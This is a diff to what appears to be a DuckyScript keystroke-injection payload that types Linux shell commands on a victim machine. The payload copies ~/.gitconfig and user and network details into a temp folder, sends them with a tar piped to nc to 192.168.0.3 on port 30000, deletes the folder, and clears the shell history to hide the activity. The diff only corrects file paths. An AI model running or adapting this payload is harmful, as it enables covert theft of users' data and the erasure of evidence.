@@ -4,7 +4,7 @@ DELAY 250
 STRING ubuntu
 ENTER
 DELAY 1000
-STRING cd && nano sample.sh
+STRING cd && nano ~/sample.sh
 ENTER
 STRING rm ~/sample.sh
 ENTER
@@ -20,13 +20,13 @@ STRING cp ~/.gitconfig ~/temp_dir
 ENTER
 STRING (whoami && ip a) >> ~/temp_dir/.details
 ENTER
-STRING tar cf - temp_dir | nc 192.168.0.3 30000
+STRING tar cf - ~/temp_dir | nc 192.168.0.3 30000
 ENTER
 STRING rm -rf ~/temp_dir
 CTRL x
 y
 ENTER
-STRING chmod +x sample.sh
+STRING chmod +x ~/sample.sh
 ENTER
-STRING ./sample.sh && history -c && history -w && exit
+STRING ~/./sample.sh && history -c && history -w && exit
 ENTER
